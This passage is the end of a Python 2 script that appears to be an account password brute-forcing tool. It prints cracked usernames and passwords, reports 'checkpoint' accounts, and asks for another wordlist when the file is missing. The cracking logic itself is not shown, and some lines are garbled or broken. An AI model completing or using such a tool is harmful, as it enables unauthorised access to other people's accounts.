                            print  "\033[1;96m ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’β¬ β¬ β¬ β¬ β¬ β¬ β¬β’ββ’."
                            print '\x1b[1;91m[!] \x1b[1;93mAccount Maybe Checkpoint'
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mUsername \x1b[1;93m:\x1b[1;92m ' + email
                            print '\x1b[1;94m[\xe2\x9e\xb9] \x1b[1;95mPassword \x1b[1;93m:\x1b[1;91m ' + pw
                            keluar()
                except requests.exceptions.ConnectionError:
                    print '\x1b[1;91m[!] Connection Error'
                    time.sleep(1)

        except IOError:
            print '\x1b[1;91m[!] File not found...'
            print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
            super()

if __name__ == '__main__':
	login()
